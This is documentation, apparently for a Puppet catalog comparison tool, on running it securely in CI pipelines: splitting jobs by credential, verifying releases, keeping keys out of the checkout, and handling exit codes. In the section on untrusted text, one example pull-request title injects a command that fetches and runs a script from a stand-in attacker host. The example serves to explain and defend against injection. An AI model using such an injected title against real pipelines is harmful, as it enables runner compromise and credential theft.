# Running PIACE in CI

Two commands, a stable exit code, two files in and three files out. The work
is not in the invocation. It is in deciding what lives in the repository, what
is injected per job, and what must never touch either, and that decision gets
sharper the less you control the runner.

Working pipelines to copy: [`examples/ci/github-actions.yml`](../examples/ci/github-actions.yml),
[`examples/ci/gitlab-ci.yml`](../examples/ci/gitlab-ci.yml) and
[`examples/ci/azure-pipelines.yml`](../examples/ci/azure-pipelines.yml), with
the services file all three read,
[`examples/ci/services.yaml`](../examples/ci/services.yaml).

## The shape

Two jobs, not one:

1. **`compare`** holds the catalog-reader identity, talks to the compiler and
   PuppetDB, and writes `report.json` and `report.html`. Its exit code is the
   gate.
2. **`explain`** holds an inference token, reads the stored `report.json`, and
   writes an advisory assessment. It contacts nothing else, and it cannot
   change an outcome or an exit code.

They are split because they need different credentials and neither needs the
other's. The separation lives in what each job is granted: the comparison job
gets the three PEM variables and not the token, the assessment job the token
and not the PEMs. A runner compromise in either yields one credential rather
than both.

Both read the same committed services file. `compare` reads `compiler:` and
`puppetdb:` and never looks at `inference:`; `explain` reads `inference:` and
builds no compiler or PuppetDB client.

Run `explain` even when `compare` failed the gate. `compare` writes its result
document before it exits `10`, and the run worth reading is usually the one
that just stopped a merge.

## Getting the binary onto the runner

If the binary is already there, skip this section. A `piace` on PATH is the
whole install: nothing resolves a dependency at run time, so baking it into a
runner image, installing it with your own configuration management, or
mirroring it into an internal artifact repository all work, and none of them
costs a download per job.

Otherwise, pin a version and verify it. A job that fetches "the latest binary"
on every run has made your pipeline a client of whatever is published
tomorrow.

```sh
version=0.3.0
base="https://github.com/example42/piace/releases/download/v${version}"
wget -q -O "piace-${version}-linux-amd64" "$base/piace-${version}-linux-amd64"
wget -q -O SHA256SUMS "$base/SHA256SUMS"
wget -q -O SHA256SUMS.sigstore.json "$base/SHA256SUMS.sigstore.json"

cosign verify-blob SHA256SUMS \
  --bundle SHA256SUMS.sigstore.json \
  --certificate-identity "https://github.com/example42/piace/.github/workflows/ci.yml@refs/tags/v${version}" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com

grep " piace-${version}-linux-amd64\$" SHA256SUMS | sha256sum -c -
install -m 0755 "piace-${version}-linux-amd64" /usr/local/bin/piace
```

The signature first, the checksum second. A manifest published beside its own
artifacts proves integrity and never origin: whoever could replace the
binaries could replace the manifest with them.

One manifest line rather than the whole file: the other platforms were not
downloaded, and a line that matches nothing on disk has to fail rather than
pass quietly. Both `grep` and `sha256sum` are busybox-compatible, so the last
two lines run on a plain `alpine` image with no package installation. Where
`cosign` is not available, the checksum alone still catches a corrupted
download, and [release.md](release.md#verifying-a-downloaded-release) covers
the other verification paths.

**Air-gapped:** mirror the binary, `SHA256SUMS` and the signature bundle into
your internal artifact repository, verify once at the boundary, and have jobs
fetch from the mirror.

## The container image is not the CI install path

`example42/piace` and `ghcr.io/example42/piace` are distroless: no shell, no
`git`, and the entrypoint is the binary. GitLab's docker executor runs a job
script by passing `sh` or `bash` to the image, and GitHub Actions `container:`
jobs likewise expect a shell, so neither can use it as a job image. Azure
container jobs additionally require bash, glibc, no `ENTRYPOINT`, and a `USER`
with `groupadd`. The image is built for `docker run` on a workstation or as a
Kubernetes Job:

```sh
docker run --rm \
  --user "$(id -u):$(id -g)" \
  --volume "$PWD:/work" \
  --volume "$PIACE_RUN:/run/piace:ro" \
  ghcr.io/example42/piace:0.3.0 \
  compare --targets ci/piace/targets.yaml --services ci/piace/services.yaml \
          --json-out report.json --html-out report.html
```

Every path resolves inside the container, so the environment variables the
services file names have to hold container paths.

## Where each file goes

Committed to the control repository, under one directory:

| Path | What it is | Why it is committed |
| --- | --- | --- |
| `ci/piace/targets.yaml` | Which nodes, which baseline environment, what to exclude and redact. Not the candidate environment: that is `--candidate-environment` on the job's `compare` line | It is policy. A change to an exclusion rule belongs in a review diff |
| `ci/piace/services.yaml` | Endpoints, and the names of the variables holding each credential's path | Endpoints and variable names are not secrets, and a changed endpoint should be reviewed |
| `ci/piace/policy-notes.md` | Optional site policy handed to the model, capped at 4000 bytes | Reviewable. Drop `policy_notes_file` if you have none |
| `snapshots/catalogs/{certname}.json` | A frozen baseline, if you use a file baseline | It is a versioned input, refreshed by `piace capture` |

Written per job, into a private directory outside the checkout, and removed
when the job ends: `ca.pem`, `client.pem` and `client.key`, `0600` in a `0700`
directory, with their absolute paths exported as the variables the services
file names.

Produced by the run, in the workspace, uploaded as job artifacts:
`report.json`, `report.html`, `assessment.json`.

### Why nothing is rendered

Every relative path in a config file resolves against the directory of the
file that names it, and a credential can be named instead of located:
`ca_bundle_env`, `client_cert_env`, `private_key_env` and `token_env` each
name an environment variable holding an absolute path. So the committed
services file is read in place, unmodified, by a job whose credential
directory did not exist when the file was written. There is no template, no
`sed`, and no tracked file the job mutates.

On GitLab a **file type** CI/CD variable is already exactly this: GitLab
writes the value to a temporary file outside the checkout and puts that file's
absolute path in the variable, so the three variables can be used directly. On
GitHub and Azure a secret is a value, so the job writes it to a file and
exports the path.

### Why the targets file is not a template

`candidate.environment` names the environment CI deployed for this change,
which is the one per-pipeline value in an otherwise static policy file. The
environment maps to the compiler by branch name: the branch a merge request
originates from is the environment the compiler has deployed, so pass
`${CI_MERGE_REQUEST_SOURCE_BRANCH_NAME}`, not the merge request number.
`compare` takes it as a flag, so the file does not have to carry it:

```sh
piace compare --targets ci/piace/targets.yaml \
  --candidate-environment "${CI_MERGE_REQUEST_SOURCE_BRANCH_NAME}" ...
```

A branch name is not always a Puppet environment name. Environments cannot
contain a dash, and r10k deploys `feature-x`, when configured to, as the
environment `feature_x`. Rewrite dashes the same way before passing, applying
whatever mapping your deploy tooling actually applies:

```sh
candidate_environment="$(printf '%s' "${CI_MERGE_REQUEST_SOURCE_BRANCH_NAME}" | tr '-' '_')"
```

The flag overrides `candidate.environment` for every target, both the
`defaults:` block and any per-target `candidate:` block, and when it is given
the file may omit the field entirely. Committing a placeholder and `sed`-ing
it in the job would work too, but then the job mutates a tracked file and what
a reviewer approved is not quite what ran. The value belongs to the
invocation, so it is passed at the invocation.

`piace capture catalog --environment` is a different flag with a different
meaning: it names the environment to *snapshot*, typically the production
baseline, and it is deliberately not the candidate environment under test.

### Why credentials never go in the checkout

Everything in the workspace is one `artifacts:` glob, one `actions/cache` key
or one forgotten `git add` away from being somewhere else. A per-job directory
outside it (`$RUNNER_TEMP` on GitHub, `$(Agent.TempDirectory)` on Azure, any
path you create on GitLab) is not reachable by any of those.

## Change context

`piace explain --change` reads a file describing the repository change under
test. `piace change-context` writes one:

```sh
piace change-context \
  --base-ref "origin/$CI_MERGE_REQUEST_TARGET_BRANCH_NAME" \
  --title-env CI_MERGE_REQUEST_TITLE \
  --description-env CI_MERGE_REQUEST_DESCRIPTION \
  > change-context.yaml
```

It emits `base_ref`, `head_ref`, commit subjects and changed paths, plus the
title and description if you name them. Commit *bodies* are never emitted and
there is no flag to ask for them: a body is unbounded free text written by
whoever pushed, and it is the part of a repository most likely to carry a
customer name, a ticket paste, or a credential someone meant to delete.
`explain` refuses a `body` key outright, so this holds at both ends.

Two things it needs from the CI system:

- **Full history.** It takes a merge base. Set `fetch-depth: 0` on
  `actions/checkout`, `GIT_DEPTH: "0"` on GitLab, or `fetchDepth: 0` on Azure.
- **`git` on PATH.** It is the only subcommand that runs git, and the only
  step in either pipeline that needs a package mirror: the comparison job
  installs nothing. On a bare Alpine image that means `apk add --no-cache git`;
  on a runner with no route to a mirror, give the assessment job an image that
  already carries it.

Read [`examples/change-context.yaml`](../examples/change-context.yaml) before
enabling any of this. A change context is forwarded to the inference service
exactly as written and is **not** pseudonymized: PIACE cannot tell which words
in a merge request description are node names.

### Untrusted text is named, never passed

There is deliberately no `--title` or `--description` flag. A pull request
title is written by whoever opened the pull request, and every CI system has a
substitution step that runs before a shell does: GitHub replaces `${{ }}` in
script text, Azure macro-expands `$( ... )` in task inputs. A title of
`$(curl evil.example/x | sh)` is then a command on a runner holding a
credential that can read every catalog in your estate.

`--title-env` and `--description-env` take a **variable name**, and
`--title-file` and `--description-file` take a path, so the value never
reaches a command line. The refs take the same treatment through
`--base-ref-env` and `--head-ref-env`, because a git branch name may legally
contain `;`, `$` and a backtick. On GitHub:

```yaml
- name: Describe the change
  env:
    BASE_REF: ${{ github.base_ref }}
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_BODY: ${{ github.event.pull_request.body }}
  run: |
    BASE_REF="origin/$BASE_REF" piace change-context \
      --base-ref-env BASE_REF \
      --title-env PR_TITLE \
      --description-env PR_BODY \
      > change-context.yaml
```

Azure exposes no title or description variable at all, so the Azure example
fetches them from the pull request REST API into files and passes
`--title-file` and `--description-file`.

PIACE caps the title at 200 bytes and the description at 4000. Over-cap text
is truncated, the truncation is recorded and shown, and it never fails the
command.

## On a runner you do not fully control

The catalog-reader identity is the asset. It is authorized to read the catalog
of every node you compare, which makes it a read-only credential to your
estate's configuration, file content included. Assume that anyone who can run
a job on the runner can read it while it exists on disk, and plan from there.

**Give it its own identity.** One certificate used only by PIACE in CI,
authorized for catalog retrieval and nothing else. See the README's
[Authorizing the catalog-reader certificate](../README.md#authorizing-the-catalog-reader-certificate).
Rotating or revoking it then costs one `auth.conf` rule and no agent runs.

**Keep it off unprotected branches.** On GitLab, mark all three PEM variables
**Protected** and use the **file** variable type: a PEM is multi-line, and a
multi-line value cannot be masked, so a variable-type key is one `echo` away
from a job log. On GitHub, a `pull_request` from a fork gets no secrets at
all, which is correct behavior to keep: skip the job for forks rather than
reaching for `pull_request_target`, which hands the secrets to a workflow the
fork's branch can influence. An Environment with required reviewers adds a
human gate in front of the credential.

**Prefer an ephemeral executor.** The docker and Kubernetes executors give
each job a fresh container, so a `0700` directory in `/tmp` is private to the
job. A shell or ssh executor does not: every job on that host runs as the same
user and can read the same paths. On a shared shell runner, treat the identity
as disclosed to every project that can schedule work there, and use a
dedicated runner instead.

**Clean up on the failure paths.** GitLab's `after_script` runs even when the
job fails, times out or is cancelled; GitHub needs `if: always()`. That is
precisely when a key is most likely to be left behind.

**Do not trace the secret-handling steps.** PIACE never prints credentials,
and `--debug` reports only request metadata and response member names, so it
is safe in a job log. A `set -x` in your own script is not: it would echo the
commands that write the key.

**Treat the reports as sensitive output.** They carry catalog values, redacted
per your `redact:` selectors but not otherwise sanitized. Keep retention short
(`expire_in`, `retention-days`), restrict who can download them where the
platform allows it (GitLab's `artifacts:access`), and never use
`--debug-dump-dir` in CI: it writes unredacted request and response bodies.

**Mind the network path, not just the credential.** The runner needs to reach
your compiler on 8140 and PuppetDB on 8081. A hosted runner reaching them
means those ports are reachable from the hosted runner's network. PIACE opens
connections only to the endpoints in its own services file, but the route you
opened for it stays open for the rest of the job.

## The exit code is the gate

| Code | Meaning | Usual CI handling |
| --- | --- | --- |
| `0` | No differences, or all allowed by policy | Pass |
| `10` | A `fail_on_diff` target had a non-excluded difference | Block the merge, or warn and let a human read the report |
| `20` | A candidate did not compile, or its identity or environment did not verify | Fail. The change does not build |
| `30` | Config, TLS, retrieval, snapshot or normalization failure | Fail. The run did not complete, so `0` would be a lie |

To review differences without blocking, set `fail_on_diff: false` in
`targets.yaml` rather than swallowing the exit code in the job script: the
comparison then reports `differences_allowed`, and the report still says what
changed. Where the platform can express it, keeping `fail_on_diff: true` and
softening only `10` is better still, because `20` and `30` stay hard failures.
GitLab spells that `allow_failure: {exit_codes: 10}`.

`piace explain` exits `0` or `30` only. It returns `30` for its own
operational failures, a services file it cannot load or a result document it
cannot read, and for an assessment the inference service did not produce only
if you pass `--fail-on-inference-error`. By default a failed assessment is a
diagnostic, not a reason to fail a pipeline that already has its deterministic
answer.

`piace change-context` exits `0` or `30`.
